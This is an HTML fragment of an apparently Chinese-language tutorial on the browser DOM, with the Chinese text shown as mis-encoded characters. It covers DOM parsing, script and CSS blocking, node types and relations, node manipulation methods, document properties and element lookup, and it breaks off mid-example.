      <content type="html"><![CDATA[<h3 id="0-DOM"><a href="#0-DOM" class="headerlink" title="0. DOM"></a>0. DOM</h3><p>ä»ç½‘ç»œä¼ ç»™æ¸²æŸ“å¼•æ“çš„HTMLæ–‡ä»¶å­—èŠ‚æµæ˜¯æ— æ³•ç›´æ¥è¢«æ¸²æŸ“å¼•æ“ç†è§£çš„ï¼Œæ‰€ä»¥è¦å°†å…¶è½¬åŒ–ä¸ºæ¸²æŸ“å¼•æ“èƒ½å¤Ÿç†è§£çš„å†…éƒ¨ç»“æ„ï¼Œè¿™ä¸ªç»“æ„å°±æ˜¯ DOMã€‚<em>DOM æ˜¯è¡¨è¿° HTML çš„å†…éƒ¨æ•°æ®ç»“æ„ã€‚</em></p><ul><li>ä»é¡µé¢è§†è§’çœ‹ï¼ŒDOMæ˜¯ç”Ÿæˆé¡µé¢çš„åŸºç¡€æ•°æ®ç»“æ„</li><li>ä» JavaScript è„šæœ¬è§†è§’æ¥çœ‹ï¼ŒDOM æä¾›ç»™ JavaScript è„šæœ¬æ“ä½œçš„æ¥å£ï¼Œé€šè¿‡è¿™å¥—æ¥å£ï¼ŒJavaScript å¯ä»¥å¯¹ DOM ç»“æ„è¿›è¡Œè®¿é—®ï¼Œä»è€Œæ”¹å˜æ–‡æ¡£çš„ç»“æ„ã€æ ·å¼å’Œå†…å®¹</li><li>ä»å®‰å…¨è§†è§’æ¥çœ‹ï¼ŒDOM æ˜¯ä¸€é“å®‰å…¨é˜²æŠ¤çº¿ï¼Œä¸€äº›ä¸å®‰å…¨çš„å†…å®¹åœ¨ DOM è§£æé˜¶æ®µå°±è¢«æ‹’ä¹‹é—¨å¤–äº†ã€‚</li></ul><p><br></p><h4 id="DOMæ ‘å¦‚ä½•ç”Ÿæˆï¼Ÿ"><a href="#DOMæ ‘å¦‚ä½•ç”Ÿæˆï¼Ÿ" class="headerlink" title="DOMæ ‘å¦‚ä½•ç”Ÿæˆï¼Ÿ"></a><em>DOMæ ‘å¦‚ä½•ç”Ÿæˆï¼Ÿ</em></h4><p>åœ¨æ¸²æŸ“å¼•æ“å†…éƒ¨ï¼Œæœ‰ä¸€ä¸ªå« <strong>HTML è§£æå™¨ï¼ˆHTMLParser</strong>ï¼‰çš„æ¨¡å—ï¼Œå®ƒçš„èŒè´£å°±æ˜¯è´Ÿè´£å°† HTML å­—èŠ‚æµè½¬æ¢ä¸º DOM ç»“æ„ã€‚<br>å…·ä½“çš„æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç½‘ç»œè¿›ç¨‹æ¥æ”¶åˆ°å“åº”å¤´åï¼Œå¦‚æœ<code>content-typeæ˜¯text/html</code>, é‚£ä¹ˆæµè§ˆå™¨å°±ä¼šåˆ¤æ–­è¿™æ˜¯ä¸€ä¸ª HTML ç±»å‹çš„æ–‡ä»¶ï¼Œç„¶åä¸ºè¯¥è¯·æ±‚é€‰æ‹©æˆ–è€…åˆ›å»ºä¸€ä¸ªæ¸²æŸ“è¿›ç¨‹</li><li>æ¸²æŸ“è¿›ç¨‹å‡†å¤‡å¥½ä¹‹åï¼Œç½‘ç»œè¿›ç¨‹æ¥æ”¶åˆ°æ•°æ®åï¼Œå°†æ•°æ®ä¼ é€’ç»™æ¸²æŸ“è¿›ç¨‹ã€‚æ¸²æŸ“è¿›ç¨‹åˆ™æŠŠæ•°æ®äº¤ç»™<strong>HTMLè§£æå™¨</strong>ï¼ˆ HTML è§£æå™¨å¹¶ä¸æ˜¯ç­‰æ•´ä¸ªæ–‡æ¡£åŠ è½½å®Œæˆä¹‹åå†è§£æçš„ï¼Œè€Œæ˜¯ç½‘ç»œè¿›ç¨‹åŠ è½½äº†å¤šå°‘æ•°æ®ï¼ŒHTML è§£æå™¨ä¾¿è§£æå¤šå°‘æ•°æ®ã€‚ï¼‰</li><li>é€šè¿‡åˆ†è¯å™¨å°†å­—èŠ‚æµè½¬æ¢æˆToken<br><img src="/2018/10/07/DOM/6.jpg"></li><li>å°†Tokenè§£æä¸ºDOMèŠ‚ç‚¹ï¼Œå¹¶å°†DOMèŠ‚ç‚¹æ·»åŠ åˆ°DOMæ ‘ä¸­<br><img src="/2018/10/07/DOM/7.jpg" style="width: 600px"></li></ul><p><br></p><h4 id="JSä¼šé˜»å¡DOMç”Ÿæˆå—ï¼Ÿ-â€”â€”-ä¼š"><a href="#JSä¼šé˜»å¡DOMç”Ÿæˆå—ï¼Ÿ-â€”â€”-ä¼š" class="headerlink" title="JSä¼šé˜»å¡DOMç”Ÿæˆå—ï¼Ÿ â€”â€” ä¼š"></a><em>JSä¼šé˜»å¡DOMç”Ÿæˆå—ï¼Ÿ</em> â€”â€” ä¼š</h4><ul><li><p>è§£æåˆ°<em><code>å†…åµŒ&lt;script&gt;è„šæœ¬</code></em>æ ‡ç­¾æ—¶ï¼Œæ¸²æŸ“å¼•æ“åˆ¤æ–­è¿™æ˜¯ä¸€æ®µè„šæœ¬ï¼Œæ­¤æ—¶ HTML è§£æå™¨å°±ä¼šæš‚åœ DOM çš„è§£æï¼Œå› ä¸ºæ¥ä¸‹æ¥çš„ JavaScript å¯èƒ½è¦ä¿®æ”¹å½“å‰å·²ç»ç”Ÿæˆçš„ DOM ç»“æ„ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> div1 = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'div'</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">      div1.innerText = <span class="string">'time.geekbang'</span></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>è§£æåˆ°<em><code>&lt;scirpt&gt;æ–‡ä»¶</code></em>æ—¶ï¼Œæ‰§è¡Œæµç¨‹è¿˜æ˜¯ä¸€æ ·çš„ï¼Œä¼šæš‚åœæ•´ä¸ªDOMçš„è§£æï¼Œå…ˆä¸‹è½½è¿™ä¸ªJSæ–‡ä»¶ï¼Œç„¶åæ‰§è¡ŒJSä»£ç </p></li><li><p><em><code>async</code></em> æˆ– <em><code>defer</code></em> æ¥æ ‡è®°ä»£ç </p><ul><li><em><code>async</code></em> ä¸€æ—¦åŠ è½½å®Œæˆï¼Œä¼šç«‹å³æ‰§è¡Œï¼›</li><li><p><em><code>defer</code></em> åœ¨ DOMContentLoaded äº‹ä»¶ä¹‹å‰æ‰§è¡Œã€‚</p><ul><li><em><code>onload</code></em> é¡µé¢ä¸Šæ‰€æœ‰çš„DOMï¼Œæ ·å¼è¡¨ï¼Œè„šæœ¬ï¼Œå›¾ç‰‡ï¼Œflashéƒ½å·²ç»åŠ è½½å®Œæˆäº†ã€‚</li><li><em><code>DOMContentLoaded</code></em> ä»…DOMåŠ è½½å®Œæˆï¼Œä¸åŒ…æ‹¬æ ·å¼è¡¨ï¼Œå›¾ç‰‡ï¼Œflashã€‚</li></ul></li></ul></li><li><p>é¢„è§£ææ“ä½œï¼šå½“æ¸²æŸ“å¼•æ“æ”¶åˆ°å­—èŠ‚æµä¹‹åï¼Œä¼šå¼€å¯ä¸€ä¸ªé¢„è§£æçº¿ç¨‹ï¼Œç”¨æ¥åˆ†æ HTML æ–‡ä»¶ä¸­åŒ…å«çš„ JavaScriptã€CSS ç­‰ç›¸å…³æ–‡ä»¶ï¼Œè§£æåˆ°ç›¸å…³æ–‡ä»¶ä¹‹åï¼Œé¢„è§£æçº¿ç¨‹ä¼šæå‰ä¸‹è½½è¿™äº›æ–‡ä»¶ã€‚</p></li></ul><p><br></p><h4 id="CSSä¼šé˜»å¡DOMç”Ÿæˆå—ï¼Ÿ-â€”â€”-æœ‰æ—¶ä¼šï¼Œæœ‰æ—¶ä¸ä¼š"><a href="#CSSä¼šé˜»å¡DOMç”Ÿæˆå—ï¼Ÿ-â€”â€”-æœ‰æ—¶ä¼šï¼Œæœ‰æ—¶ä¸ä¼š" class="headerlink" title="CSSä¼šé˜»å¡DOMç”Ÿæˆå—ï¼Ÿ â€”â€” æœ‰æ—¶ä¼šï¼Œæœ‰æ—¶ä¸ä¼š"></a><em>CSSä¼šé˜»å¡DOMç”Ÿæˆå—ï¼Ÿ</em> â€”â€” æœ‰æ—¶ä¼šï¼Œæœ‰æ—¶ä¸ä¼š</h4><p>åœ¨æµè§ˆå™¨è§£æç½‘é¡µçš„è¿‡ç¨‹ä¸­ï¼ŒDOM æ ‘çš„æ„å»ºæ˜¯ç”± HTML è§£æå™¨å®Œæˆçš„ï¼Œè§£æå™¨ä¼šé€è¡Œè§£æ HTML å¹¶æ„å»º DOM æ ‘ã€‚å³ä½¿ CSS æ–‡ä»¶æ­£åœ¨ä¸‹è½½æˆ–è§£æï¼ŒHTML è§£æå™¨ä»ç„¶ä¼šç»§ç»­å·¥ä½œï¼Œæ„å»º DOM æ ‘ã€‚å› ä¸º DOM è§£æå’Œ CSS è§£ææ˜¯ä¸¤ä¸ªå¹¶è¡Œçš„è¿›ç¨‹ï¼Œæ‰€ä»¥ CSS åŠ è½½ä¸ä¼šé˜»å¡ DOM çš„è§£æã€‚</p><p>ä½†æ˜¯ï¼Œå½“JSä»£ç å‡ºç°äº† <code>div1.style.color = â€˜red&#39;</code> çš„è¯­å¥ï¼Œå®ƒæ˜¯ç”¨æ¥æ“çºµ CSSOM çš„ï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œä¹‹å‰ï¼Œéœ€è¦å…ˆè§£æjsè¯­å¥ä¹‹ä¸Šæ‰€æœ‰çš„ CSS æ ·å¼ã€‚æ‰€ä»¥å¦‚æœä»£ç é‡Œå¼•ç”¨äº†å¤–éƒ¨çš„ CSS æ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œjsä¹‹å‰ï¼Œè¿˜éœ€è¦ç­‰å¾…å¤–éƒ¨çš„ CSS æ–‡ä»¶ä¸‹è½½å®Œæˆï¼Œå¹¶è§£æç”Ÿæˆ CSSOM å¯¹è±¡ä¹‹åï¼Œæ‰èƒ½æ‰§è¡Œã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">src</span>=<span class="string">'theme.css'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> div1 = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'div'</span>)[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript">      div1.innerText = <span class="string">'time.geekbang'</span> <span class="comment">//éœ€è¦DOM</span></span></span><br><span class="line"><span class="javascript">      div1.style.color = <span class="string">'red'</span>  <span class="comment">//éœ€è¦CSSOM</span></span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h4 id="DOMä»€ä¹ˆæ—¶å€™æ¸²æŸ“ï¼Ÿ"><a href="#DOMä»€ä¹ˆæ—¶å€™æ¸²æŸ“ï¼Ÿ" class="headerlink" title="DOMä»€ä¹ˆæ—¶å€™æ¸²æŸ“ï¼Ÿ"></a><em>DOMä»€ä¹ˆæ—¶å€™æ¸²æŸ“ï¼Ÿ</em></h4><p><br></p><h3 id="1-Node"><a href="#1-Node" class="headerlink" title="1. Node"></a>1. Node</h3><p>DOMæ˜¯é’ˆå¯¹HTMLå’ŒXMLæ–‡æ¡£çš„ä¸€ä¸ªAPIã€‚DOMæè¿°äº†ä¸€ä¸ªå±‚æ¬¡åŒ–çš„èŠ‚ç‚¹æ ‘ï¼Œå…è®¸å¼€å‘äººå‘˜æ·»åŠ ã€ç§»é™¤å’Œä¿®æ”¹é¡µé¢çš„æŸä¸€éƒ¨åˆ†ã€‚æ¯ä¸€æ®µæ ‡è®°éƒ½å¯ä»¥é€šè¿‡æ ‘ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹æ¥è¡¨ç¤ºã€‚<br><img src="/2018/10/07/DOM/1.png" style="max-width:250px"></p><p><br></p><h4 id="1-1-èŠ‚ç‚¹ç±»å‹"><a href="#1-1-èŠ‚ç‚¹ç±»å‹" class="headerlink" title="1.1 èŠ‚ç‚¹ç±»å‹"></a>1.1 èŠ‚ç‚¹ç±»å‹</h4><p>JSä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ç±»å‹éƒ½ç»§æ‰¿è‡ªNodeç±»å‹ï¼Œé™¤äº†IEï¼Œå…¶ä»–æµè§ˆå™¨éƒ½å¯ä»¥è®¿é—®è¿™ä¸ªç±»å‹ã€‚æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ª<code>nodeType</code>å±æ€§ï¼Œç”±12ä¸ªæ•°å€¼å¸¸é‡æ¥è¡¨ç¤ºã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Node.ELEMENT_NODE           | 1</span><br><span class="line">Node.ATTRIBUTE_NODE         | 2</span><br><span class="line">Node.TEXT_NODE              | 3</span><br><span class="line">Node.CDATA_SECTION_NODE     | 4</span><br><span class="line">Node.ENTITY_REFERENCE_NODE  | 5</span><br><span class="line">Node.ENTITY_NODE            | 6</span><br><span class="line">Node.PROCESSING_INSTRUCTION_NODE | 7 </span><br><span class="line">Node.COMMENT_NODE           | 8</span><br><span class="line">Node.DOCUMENT_NODE          | 9</span><br><span class="line">Node.DOCUMENT_TYPE_NODE     | 10</span><br><span class="line">Node.DOCUMENT_FRAGMENT_NODE | 11</span><br><span class="line">Node.NOTATION_NODE          | 12</span><br></pre></td></tr></table></figure></p><p>è¦äº†è§£èŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨<code>nodeName</code>å’Œ<code>nodeValue</code>å±æ€§ã€‚</p><p><br></p><h4 id="1-2-èŠ‚ç‚¹å…³ç³»"><a href="#1-2-èŠ‚ç‚¹å…³ç³»" class="headerlink" title="1.2 èŠ‚ç‚¹å…³ç³»"></a>1.2 èŠ‚ç‚¹å…³ç³»</h4><p>æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ª<code>childNodes</code>å±æ€§ï¼Œå…¶ä¸­ä¿å­˜ç€ä¸€ä¸ª<code>NodeList</code>å¯¹è±¡ã€‚<code>NodeList</code>æ˜¯ä¸€ç§ç±»æ•°ç»„å¯¹è±¡ï¼Œç”¨äºä¿å­˜ä¸€ç»„æœ‰åºçš„èŠ‚ç‚¹ï¼Œå®ƒå®é™…ä¸ŠåŸºäºDOMç»“æ„åŠ¨æ€æ‰§è¡ŒæŸ¥è¯¢çš„ç»“æœã€‚DOMç»“æ„çš„å˜åŒ–èƒ½è‡ªåŠ¨åæ˜ åœ¨<code>NodeList</code>å¯¹è±¡ä¸­ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">someNode.childNodes[0]      // å­èŠ‚ç‚¹</span><br><span class="line">someNode.childNodes.item(1)</span><br><span class="line">someNode.hasChildNodes()    // æ˜¯å¦æœ‰å­èŠ‚ç‚¹</span><br><span class="line"></span><br><span class="line">someNode.parentNode         // çˆ¶èŠ‚ç‚¹</span><br><span class="line">someNode.previousSibling    // å‰ä¸€ä¸ªåŒèƒèŠ‚ç‚¹</span><br><span class="line">someNode.nextSibling        // åä¸€ä¸ªåŒèƒèŠ‚ç‚¹</span><br><span class="line">someNode.fistChild == someNode.childNodes[0]  // ç¬¬ä¸€ä¸ªå­èŠ‚ç‚¹</span><br><span class="line">someNode.lastChild          // æœ€åä¸€ä¸ªå­èŠ‚ç‚¹</span><br></pre></td></tr></table></figure></p><p><code>document.getElementById(&#39;myList&#39;).childNodes</code>,IEä¼šä»»åŠ¡<code>&lt;ul&gt;</code>æœ‰ä¸‰ä¸ª<code>&lt;li&gt;</code>å­èŠ‚ç‚¹ã€‚å…¶ä»–æµè§ˆå™¨ä¼šè®¤ä¸ºï¼Œ<code>&lt;ul&gt;</code>æœ‰3ä¸ª<code>&lt;li&gt;</code>å…ƒç´ å’Œ4ä¸ªæ–‡æœ¬èŠ‚ç‚¹(liå…ƒç´ ä¹‹é—´çš„ç©ºç™½ç¬¦)ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœéœ€è¦é€šè¿‡childNodeséå†å­èŠ‚ç‚¹æ—¶ï¼Œè¦æ£€æŸ¥nodeTypeå±æ€§æ˜¯å¦ä¸º1(å…ƒç´ èŠ‚ç‚¹)ã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"myList"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"myList"</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Item 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-3-æ“ä½œèŠ‚ç‚¹"><a href="#1-3-æ“ä½œèŠ‚ç‚¹" class="headerlink" title="1.3 æ“ä½œèŠ‚ç‚¹"></a>1.3 æ“ä½œèŠ‚ç‚¹</h4><ul><li><p><em>appendChild</em><br>ç”¨äºå‘<code>childNodes</code>åˆ—è¡¨çš„æœ«å°¾æ·»åŠ ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">someNode.appendChild(newNode);</span><br><span class="line">console.log(someNode.lastChild = newNode) // true</span><br></pre></td></tr></table></figure></li><li><p><em>insertBefore</em><br>æŠŠèŠ‚ç‚¹æ”¾åœ¨<code>childNodes</code>åˆ—è¡¨ä¸­æŸä¸ªç‰¹å®šä½ç½®ä¸Šã€‚æ’å…¥èŠ‚ç‚¹åï¼Œè¢«æ’å…¥çš„èŠ‚ç‚¹ä¼šå˜æˆå‚ç…§èŠ‚ç‚¹çš„å‰ä¸€ä¸ªåŒèƒèŠ‚ç‚¹(previousSibling)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">someNode.insertBoefore(newNode, someNode.firstChild) // æ’å…¥åæˆä¸ºç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span><br><span class="line">someNode.insertBefore(newNode, someNode.lastChild) // æ’å…¥åæˆä¸ºå€’æ•°ç¬¬äºŒä¸ªèŠ‚ç‚¹</span><br></pre></td></tr></table></figure></li><li><p><em>replaceChild</em><br>å°†è¦æ›¿æ¢çš„èŠ‚ç‚¹ä»æ–‡æ¡£æ ‘ä¸­ç§»å‡ºï¼ŒåŒæ—¶è¦æ’å…¥çš„èŠ‚ç‚¹å æ®ä½ç½®ã€‚è¦ä½¿ç”¨ä¸Šé¢è¿™å‡ ä¸ªæ–¹æ³•å¿…é¡»å…ˆå–å¾—çˆ¶èŠ‚ç‚¹<code>parentNode</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">someNode.replaceChild(newNode, someNode.firstChild) // æ›¿æ¢ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span><br></pre></td></tr></table></figure></li><li><p><em>removeChild</em><br>ç§»é™¤èŠ‚ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">someNode.removeChild(someNode.firstChild) // ç§»é™¤ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span><br></pre></td></tr></table></figure></li><li><p><em>cloneNode</em><br>åˆ›å»ºè°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„èŠ‚ç‚¹çš„ä¸€ä¸ªå®Œå…¨ç›¸åŒçš„å‰¯æœ¬ï¼Œæ¥å—ä¸€ä¸ªå¸ƒå°”å€¼å‚æ•°ï¼Œè¡¨ç¤ºæ˜¯å¦æ‰§è¡Œæ·±å¤åˆ¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myList.cloneNode(true)  // å¤åˆ¶èŠ‚ç‚¹å’Œæ•´ä¸ªå­èŠ‚ç‚¹æ•°</span><br><span class="line">myList.cloneNode(false) // åªå¤åˆ¶èŠ‚ç‚¹æœ¬èº«</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h3 id="2-Document"><a href="#2-Document" class="headerlink" title="2. Document"></a>2. Document</h3><p><code>document</code>å¯¹è±¡æ˜¯<code>HTMLDocument</code>çš„ä¸€ä¸ªå®ä¾‹ï¼Œè¡¨ç¤ºæ•´ä¸ªHTMLé¡µé¢ã€‚è€Œä¸”ï¼Œdocumentå¯¹è±¡æ˜¯windowå¯¹è±¡çš„å±æ€§ï¼Œå¯ä»¥ä½œä¸ºå…¨å±€å¯¹è±¡æ¥è®¿é—®ã€‚</p><p><br></p><h4 id="2-1-æ–‡æ¡£ä¿¡æ¯"><a href="#2-1-æ–‡æ¡£ä¿¡æ¯" class="headerlink" title="2.1 æ–‡æ¡£ä¿¡æ¯"></a>2.1 æ–‡æ¡£ä¿¡æ¯</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">document.documentElement // æŒ‡å‘&lt;html&gt;å…ƒç´ </span><br><span class="line">document.body     // æŒ‡å‘&lt;body&gt;å…ƒç´ </span><br><span class="line">document.title    // æ–‡æ¡£æ ‡é¢˜</span><br><span class="line">document.URL      // å®Œæ•´çš„url</span><br><span class="line">document.domain   // åŸŸå</span><br><span class="line">document.referrer // æ¥æºé¡µé¢çš„URL</span><br><span class="line"></span><br><span class="line">document.title = &apos;é¦–é¡µ&apos;</span><br><span class="line">document.domain = &apos;wrox.com&apos;</span><br><span class="line"></span><br><span class="line">document.anchors  // æ–‡æ¡£ä¸­æ‰€æœ‰å¸¦nameå±æ€§çš„&lt;a&gt;å…ƒç´ </span><br><span class="line">document.forms    // æ–‡æ¡£ä¸­æ‰€æœ‰&lt;form&gt;å…ƒç´ </span><br><span class="line">document.images   // æ–‡æ¡£ä¸­æ‰€æœ‰&lt;img&gt;å…ƒç´ </span><br><span class="line">document.links    // æ–‡æ¡£ä¸­æ‰€æœ‰å¸¦hrefçš„&lt;a&gt;å…ƒç´ </span><br></pre></td></tr></table></figure><p><code>document.domain</code>æ˜¯å¯ä»¥è®¾ç½®çš„ï¼Œä½†ç”±äºå®‰å…¨é™åˆ¶ï¼Œå¦‚æœurlä¸­åŒ…å«ä¸€ä¸ªå­åŸŸåï¼Œ<code>p2p.wrox.com</code>å¯ä»¥æŠŠ<code>domain</code>è®¾ç½®ä¸º<code>wrox.com</code>ã€‚å½“é¡µé¢ä¸­åŒ…å«æ¥è‡ªå…¶å®ƒå­åŸŸçš„iframeæ—¶ï¼Œ é€šè¿‡å°†æ¯ä¸ªé¡µé¢çš„<code>document.domain</code>è®¾ç½®ä¸ºç›¸åŒçš„å€¼ï¼Œè¿™äº›é¡µé¢å°±å¯ä»¥äº’ç›¸è®¿é—®å¯¹æ–¹åŒ…å«çš„Javascriptå¯¹è±¡ã€‚</p><p><br></p><h4 id="2-2-æŸ¥æ‰¾å…ƒç´ "><a href="#2-2-æŸ¥æ‰¾å…ƒç´ " class="headerlink" title="2.2 æŸ¥æ‰¾å…ƒç´ "></a>2.2 æŸ¥æ‰¾å…ƒç´ </h4><ul><li><p><em>document.getElement</em><br>ä¼šè¿”å›ä¸€ä¸ª<code>HTMLCollection</code>å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸<code>NodeList</code>éå¸¸ç›¸ä¼¼ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById()</span><br><span class="line"></span><br><span class="line">document.getElementsByTagName()</span><br><span class="line">document.getElementsByTagName(&quot;*&quot;)</span><br><span class="line">document.getElementsByTagName(&apos;img&apos;)[0].src</span><br><span class="line"></span><br><span class="line">document.getElementsByName()  // å¸¸è§å–å¾—è¡¨å•é€‰é¡¹</span><br><span class="line">document.getElementsByName(&apos;color&apos;)</span><br><span class="line">&lt;input type=&quot;raido&quot; name=&quot;color&quot;&gt;</span><br><span class="line"></span><br><span class="line">document.getElementById(&apos;list&apos;).getElementsByTagName(&apos;li&apos;)</span><br></pre></td></tr></table></figure></li><li><p><em>querySelector</em><br>æ¥å—ä¸€ä¸ªCSSé€‰æ‹©ç¬¦ï¼Œè¿”å›ä¸è¯¥æ¨¡å¼åŒ¹é…çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ²¡æœ‰åˆ™è¿”å›nullã€‚<br>IE 8+, Firefox 3.5+, Safari 3.1+, Chromeå’ŒOpera 10+éƒ½æ”¯æŒ<code>querySelector()å’ŒquerySelectorAll()</code>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">"#myDiv"</span>);</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">".selected"</span>);</span><br><span class="line"><span class="built_in">document</span>.querySelector(<span class="string">"img.button"</span>);</span><br></pre></td></tr></table></figure></li><li><p><em>querySelectorAll</em><br>æ¥å—ä¸€ä¸ªCSSé€‰æ‹©ç¬¦ï¼Œè¿”å›ä¸€ä¸ªNodeListå®ä¾‹ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 